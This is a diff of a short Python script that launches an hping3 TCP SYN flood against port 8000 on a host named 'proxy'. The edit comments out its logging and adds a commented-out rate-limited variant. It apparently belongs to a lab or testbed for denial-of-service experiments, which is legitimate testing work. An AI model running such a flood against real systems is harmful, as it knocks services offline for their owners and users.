@@ -7,18 +7,19 @@ import logging
 
 RUNNING_PROCESS = None
 
-logger = logging.getLogger("hping3")
+# logger = logging.getLogger("attacker2")
 
 def run_hping3():
     global RUNNING_PROCESS
     process = subprocess.Popen(
         ['hping3', '-S', '-p', '8000', '--flood', 'proxy'], 
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT
+        # ["hping3", "-S", "-p", "8000", "-c", "10000", "-i", "u1000", "proxy"],
+        # stdout=subprocess.PIPE,
+        # stderr=subprocess.STDOUT
     )
     RUNNING_PROCESS = process
-    for line in process.stdout:
-        logger.info(line.rstrip())
+    # for line in process.stdout:
+        # logger.info(line.rstrip())
     RUNNING_PROCESS.wait()
 
 
